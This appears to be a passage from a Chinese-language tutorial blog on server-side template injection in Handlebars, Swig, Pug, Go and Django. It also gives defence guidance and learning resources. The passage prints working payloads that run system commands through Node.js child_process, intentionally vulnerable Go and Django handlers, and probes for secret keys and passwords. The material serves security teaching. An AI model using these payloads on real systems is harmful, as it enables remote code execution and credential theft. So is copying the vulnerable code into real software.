<!-- 变量输出 -->
{{username}}

<!-- 条件判断 -->
{{#if isAdmin}}
  欢迎管理员
{{/if}}

<!-- 循环遍历 -->
{{#each users}}
  {{this.name}}
{{/each}}

<!-- 使用helper -->
{{helperName param1 param2}}
```

**SSTI Payload示例：**

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**利用原型链：**

```handlebars
{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}
```

#### Swig/Pug简介

**Swig模板引擎：**

```swig
<!-- 变量输出 -->
{{ name }}

<!-- 条件判断 -->
{% if user.admin %}
  管理员
{% endif %}

<!-- 循环 -->
{% for item in items %}
  {{ item }}
{% endfor %}
```

**Swig SSTI Payload：**

```swig
{{ {}.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString() }}
```

**Pug（原Jade）模板引擎：**

```pug
// 变量输出
p= username

// 条件判断
if user.admin
  p 管理员
else
  p 普通用户

// 循环
each item in items
  p= item
```

**Pug SSTI Payload：**

```pug
- var x = eval("require('child_process').execSync('whoami')")
= x

// 或者
- global.process.mainModule.require('child_process').execSync('id').toString()
```

#### JavaScript模板注入特点

1. **原型链污染**：JavaScript的原型链特性使得模板注入可能导致RCE
2. **Node.js模块系统**：可以通过`require`加载任意模块
3. **全局对象访问**：`global`、`process`等全局对象可被利用
4. **函数构造器**：`Function`、`eval`等可执行任意代码

**通用Node.js SSTI检测：**

```javascript
// 基础探测
{{7*7}}
${7*7}
<%= 7*7 %>

// 代码执行尝试
{{global.process.mainModule.require('child_process').execSync('id').toString()}}
```

---

### Go Template

Go Template是Go语言标准库中的模板引擎，设计相对安全，但仍需注意潜在风险。

#### Go模板语法简介

```go
// 变量输出
{{.Username}}

// 条件判断
{{if .IsAdmin}}
    欢迎管理员
{{else}}
    欢迎普通用户
{{end}}

// 循环遍历
{{range .Users}}
    {{.Name}}
{{end}}

// 使用with
{{with .User}}
    {{.Name}}
{{end}}

// 定义变量
{{$var := .Value}}

// 调用函数
{{printf "%s" .Name}}
```

#### 潜在的SSTI风险

Go Template本身设计为"逻辑less"，默认情况下**不支持**直接执行任意代码。但在特定条件下仍存在风险：

**1. 传递危险函数到模板：**

```go
// 危险代码 - 将危险函数暴露给模板
func handler(w http.ResponseWriter, r *http.Request) {
    tmpl := template.New("test")
    tmpl, _ = tmpl.Parse(r.URL.Query().Get("tpl"))
    
    data := map[string]interface{}{
        "cmd": exec.Command,  // 危险！
        "os":  os,
    }
    tmpl.Execute(w, data)
}
```

**对应的Payload：**

```go
{{$cmd := .cmd "whoami"}}{{$cmd.Output}}
{{.os.Getenv "SECRET_KEY"}}
```

**2. 使用html/template与text/template：**

```go
// text/template 比 html/template 更危险
type User struct {
    Name string
    Func func(string) string  // 危险！
}
```

**3. 模板注入导致的信息泄露：**

```go
{{.SecretKey}}
{{.Config.DatabasePassword}}
{{.Env}}
```

#### 利用限制

Go Template的SSTI利用受到以下限制：

1. **无法直接调用任意函数**：只能调用模板中传递的函数或方法
2. **无法直接执行系统命令**：没有内置的`exec`或`system`函数
3. **无法访问未导出的字段**：只有大写开头的导出字段可访问
4. **类型安全**：Go的强类型特性限制了类型混淆攻击

**相对安全的模板使用：**

```go
// 安全的做法 - 只传递必要的数据
func safeHandler(w http.ResponseWriter, r *http.Request) {
    tmpl := template.Must(template.ParseFiles("template.html"))
    
    data := struct {
        Name  string
        Email string
    }{
        Name:  "John",
        Email: "john@example.com",
    }
    
    tmpl.Execute(w, data)
}
```

---

### Django模板

Django模板引擎是Python Django框架的默认模板引擎，设计上注重安全性。

#### Django模板语法

```django
<!-- 变量输出（自动转义） -->
{{ username }}

<!-- 原始输出（不转义） -->
{{ html_content|safe }}

<!-- 条件判断 -->
{% if user.is_admin %}
    欢迎管理员
{% else %}
    欢迎普通用户
{% endif %}

<!-- 循环遍历 -->
{% for item in items %}
    {{ item.name }}
{% endfor %}

<!-- 模板继承 -->
{% extends "base.html" %}
{% block content %}
    内容
{% endblock %}

<!-- 包含其他模板 -->
{% include "header.html" %}

<!-- 加载标签库 -->
{% load custom_tags %}
```

#### 与Jinja2的区别

| 特性 | Django模板 | Jinja2 |
|------|-----------|--------|
| 自动转义 | 默认启用 | 可配置 |
| 表达式语法 | 受限 | 更灵活 |
| 方法调用 | 受限 | 更自由 |
| 沙箱 | 更严格 | 可配置 |
| 性能 | 较慢 | 更快 |
| 代码执行 | 严格限制 | 相对灵活 |

**关键区别：**

```django
<!-- Django - 受限的表达式 -->
{{ user.name.upper }}

<!-- Jinja2 - 更自由的表达式 -->
{{ user.name.__class__.__mro__ }}
```

#### SSTI利用方法

Django模板引擎设计上**默认安全**，但在特定条件下仍可能存在漏洞：

**1. 使用|safe过滤器（XSS风险）：**

```django
{{ user_input|safe }}
```

**2. 自定义模板标签/过滤器漏洞：**

```python
# 危险的自定义标签
from django import template
import os

register = template.Library()

@register.filter
def exec_cmd(cmd):
    return os.popen(cmd).read()  # 危险！
```

利用：
```django
{{ "whoami"|exec_cmd }}
```

**3. 通过debug信息泄露：**

```django
{{ debug }}
{{ settings.SECRET_KEY }}
```

**4. 利用django.contrib.admin：**

```django
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e}}{% endfor %}
```

**5. 利用ORM进行数据操作：**

```django
{{ User.objects.filter(is_superuser=True).first().password }}
```

**Django SSTI检测Payload：**

```django
{{7*7}}
{{config}}
{{request}}
{{user.password}}
{{settings.SECRET_KEY}}
```

**注意事项：**

- Django模板默认阻止了对`__`开头属性的访问
- 无法直接调用任意Python函数
- 沙箱机制限制了代码执行能力
- 漏洞通常来自不安全的自定义标签/过滤器

---

## 总结

### 防御要点总结

#### 核心防御原则

1. **永远不要信任用户输入**
   - 所有用户输入都应视为不可信数据
   - 避免将用户输入直接嵌入模板字符串
   - 使用参数化模板而非字符串拼接

2. **最小权限原则**
   - 模板引擎以低权限用户运行
   - 限制模板引擎的文件系统访问权限
   - 禁用不必要的网络访问能力

3. **纵深防御策略**
   - 多层验证和过滤机制
   - 结合WAF进行请求检测
   - 实施严格的输出编码

#### 各语言/框架的关键点

| 语言/框架 | 关键防御措施 |
|-----------|-------------|
| **Python/Jinja2** | 使用`SandboxedEnvironment`、启用`autoescape`、避免`from_string`处理用户输入 |
| **PHP/Twig** | 启用沙箱模式、禁用`self`对象访问、限制过滤器使用 |
| **Java/FreeMarker** | 配置`new_builtin_class_resolver`、禁用`Execute`类、使用`Configuration`安全设置 |
| **Ruby/ERB** | 避免`eval`和`binding`、使用`ERB::Util.html_escape`、限制模板上下文 |
| **Node.js** | 禁用`eval`和`Function`构造器、限制原型链访问、使用`vm`模块沙箱 |
| **Go Template** | 仅传递必要数据、避免暴露敏感函数、使用`html/template`而非`text/template` |
| **Django** | 保持自动转义启用、谨慎使用`safe`过滤器、审计自定义标签 |

#### 安全检查清单

**开发阶段：**
- [ ] 审查所有模板渲染代码
- [ ] 验证用户输入处理逻辑
- [ ] 检查自定义模板标签/过滤器安全性
- [ ] 确保敏感信息不传递给模板

**部署阶段：**
- [ ] 配置模板引擎安全选项
- [ ] 启用自动转义和沙箱模式
- [ ] 设置适当的文件权限
- [ ] 配置WAF规则

**运维阶段：**
- [ ] 定期更新模板引擎版本
- [ ] 监控异常模板渲染行为
- [ ] 定期进行安全审计
- [ ] 建立应急响应流程

### 学习路径建议

#### 入门学习资源

1. **基础理论**
   - 理解模板引擎的工作原理
   - 学习MVC架构中视图层的设计
   - 掌握基本的Web安全概念

2. **推荐入门资料**
   - OWASP Web安全基础指南
   - 各模板引擎官方入门教程
   - Web安全基础课程（如PortSwigger Academy免费课程）

3. **实践环境搭建**
   - 搭建本地DVWA或WebGoat环境
   - 部署VulnHub SSTI相关靶机
   - 使用Docker搭建测试环境

#### 进阶学习资源

1. **深入技术细节**
   - Python对象模型和MRO机制
   - Java反射机制
   - JavaScript原型链污染

2. **高级利用技术**
   - 沙箱逃逸技术
   - 过滤器绕过方法
   - 无回显利用技巧

3. **代码审计能力**
   - 学习静态代码分析
   - 掌握常见漏洞模式识别
   - 理解安全编码规范

#### 实战练习平台

| 平台 | 特点 | 推荐题目 |
|------|------|---------|
| **PortSwigger Web Security Academy** | 系统化学习、免费 | SSTI专题实验室 |
| **Hack The Box** | 真实环境、难度分级 | SSTI相关靶机 |
| **VulnHub** | 离线靶机、多样化 | 各类SSTI漏洞靶机 |
| **CTFtime** | 竞赛题目、挑战性强 | 历年SSTI题目 |
| **BUUCTF** | 中文平台、题目丰富 | SSTI专项练习 |
| **攻防世界** | 中文平台、适合入门 | Web类SSTI题目 |

---

## 参考资源

### 官方文档

#### Python模板引擎
- [Jinja2官方文档](https://jinja.palletsprojects.com/)
- [Django模板文档](https://docs.djangoproject.com/en/stable/topics/templates/)
- [Mako模板文档](https://docs.makotemplates.org/)
- [Tornado模板文档](https://www.tornadoweb.org/en/stable/template.html)

#### PHP模板引擎
- [Twig官方文档](https://twig.symfony.com/doc/)
- [Smarty官方文档](https://www.smarty.net/docs/en/)
- [Blade模板文档](https://laravel.com/docs/blade)

#### Java模板引擎
- [FreeMarker官方文档](https://freemarker.apache.org/docs/)
- [Velocity官方文档](https://velocity.apache.org/engine/devel/user-guide.html)
- [Thymeleaf官方文档](https://www.thymeleaf.org/documentation.html)

#### 其他模板引擎
- [Ruby ERB文档](https://docs.ruby-lang.org/en/master/ERB.html)
- [Handlebars文档](https://handlebarsjs.com/guide/)
- [Pug文档](https://pugjs.org/api/getting-started.html)
- [Go Template文档](https://pkg.go.dev/html/template)

### 安全研究资源

#### OWASP相关文档
- [OWASP SSTI漏洞说明](https://owasp.org/www-community/vulnerabilities/Server-Side_Template_Injection)
- [OWASP Testing Guide - 模板注入测试](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

#### PortSwigger Web Security Academy
- [SSTI专题学习](https://portswigger.net/web-security/server-side-template-injection)
- [SSTI实验室练习](https://portswigger.net/web-security/all-labs#server-side-template-injection)
- [Research: Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)

#### 安全博客和文章
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [James Kettle的SSTI研究](https://portswigger.net/research/server-side-template-injection)
- [Black Hat SSTI演讲资料](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)

### 工具资源

#### Tplmap
- [GitHub仓库](https://github.com/epinna/tplmap)
- 功能：自动化SSTI检测和利用
- 支持：多种模板引擎的自动识别和攻击

#### 其他检测工具
- [SSTImap](https://github.com/vladko312/SSTImap) - Tplmap的改进版本
- [Burp Suite SSTI插件](https://portswigger.net/bappstore)
- [Commix](https://github.com/commixproject/commix) - 命令注入和模板注入检测
- [XSSer](https://github.com/epsylon/xsser) - 包含模板注入检测功能

#### 辅助工具
- [CyberChef](https://gchq.github.io/CyberChef/) - 编码解码工具
- [Burp Suite](https://portswigger.net/burp) - Web渗透测试平台
- [Postman](https://www.postman.com/) - API测试工具

### CTF平台

#### 国际平台
- [Hack The Box](https://www.hackthebox.com/) - 在线渗透测试平台
- [TryHackMe](https://tryhackme.com/) - 初学者友好的学习平台
- [VulnHub](https://www.vulnhub.com/) - 离线漏洞靶机
- [CTFtime](https://ctftime.org/) - CTF竞赛信息和题目

#### 国内平台
- [BUUCTF](https://buuoj.cn/) - 北京联合大学CTF平台
- [攻防世界](https://adworld.xctf.org.cn/) - XCTF联赛平台
- [BugKu](https://ctf.bugku.com/) - Web安全练习平台
- [NSSCTF](https://www.nssctf.cn/) - 网络安全技能竞赛平台
- [CTFHub](https://www.ctfhub.com/) - 技能树学习平台

#### 推荐练习题目
- **SSTI基础**：BUUCTF - [SUCTF 2019]EasyWeb
- **Jinja2逃逸**：攻防世界 - Web_php_unserialize
- **Twig注入**：Hack The Box - 相关靶机
- **复杂绕过**：各类竞赛中的高级SSTI题目

---

## 结语

SSTI作为一种高危的Web安全漏洞，其危害性不容忽视。通过本文的学习，我们深入了解了SSTI的原理、各种模板引擎的利用方法、防御策略以及相关的学习资源。

安全是一个持续学习的过程，建议读者：
1. 在合法授权的环境下进行实践
2. 关注最新的安全研究和技术发展
3. 参与CTF竞赛提升实战能力
4. 将安全思维融入日常开发工作

希望本文能够帮助你在SSTI漏洞的研究和防御方面有所收获。

---

**文章信息**

- 更新时间：2026-03-16
- 作者：Security Researcher
- 版权声明：本文为原创文章，转载请注明出处
- 免责声明：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。

**相关文章推荐**
- [SQL注入完全指南]({% post_url 2026-03-15-sql-injection-guide %})
- [XSS跨站脚本攻击详解]({% post_url 2026-03-14-xss-complete-guide %})
- [命令注入漏洞分析]({% post_url 2026-03-13-command-injection-guide %})

---

*本文最后更新于 2026-03-16*
